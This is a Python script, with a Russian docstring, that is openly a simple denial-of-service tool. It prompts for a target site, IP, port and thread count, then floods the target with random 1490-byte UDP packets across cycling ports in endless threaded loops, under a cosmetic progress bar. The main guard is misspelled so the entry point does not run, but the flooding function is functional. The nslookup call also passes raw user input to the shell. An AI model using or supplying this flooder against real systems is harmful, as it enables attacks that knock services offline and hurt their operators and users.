"""
простая dos атака на сайт
~100_000 пакетов за 20s
"""
import os
import time
import socket
import random
import threading


class Colors():
    GRAY    = '\033[97m'
    BLACK   = '\033[90m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    PINK    = '\033[95m'
    CYAN    = '\033[96m'
    END     = '\033[0m'


def attack(host, port, color='\033[92m'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    sent = 0
    while True:
        sock.sendto(bytes, (host, port))
        sent += 1
        port += 1
        print(color + "%s packet sent to %s:%s\033[0m" % (sent, host, port))
        if port == 65534:
            port = 1


if __name__ == '__main__1':
    web = input("Target website: ")
    print(os.system(f"nslookup {web}"))

    host = input(f"{Colors.BLUE}[*] {Colors.GREEN}IP Target >>> {Colors.END} ")
    port = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}PORT >>> {Colors.END} "))
    thr_counts = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}Number of threads {Colors.RED}[max target = 8]  {Colors.GREEN}>>> {Colors.END} "))

    os.system("clear")
    print(f"{Colors.BLUE}Preparing for an attack{Colors.END}")
    print(f"{Colors.BLUE}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {Colors.END}")
    print(f"{Colors.CYAN} ======D     15% {Colors.END}"); time.sleep(.2)
    print(f"{Colors.CYAN} =============D      25% {Colors.END}"); time.sleep(.3)
    print(f"{Colors.CYAN} ====================D       50% {Colors.END}"); time.sleep(.4)
    print(f"{Colors.CYAN} =============================D        75% {Colors.END}"); time.sleep(.3)
    print(f"{Colors.CYAN} =====================================D     100% {Colors.END}"); time.sleep(.2)
    os.system("clear")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print(f"{Colors.GREEN}Checking the server IP and port...{Colors.END}\n"
              f"{Colors.RED}Error! Check the correct IP and Port..{Colors.END}\n")
        raise e

    colors = [Colors.GRAY, Colors.BLACK, Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.PINK, Colors.CYAN, Colors.END,]
    for i in range(thr_counts):
        t = threading.Thread(target=attack, args=(host, port, colors[i]))
        t.start()
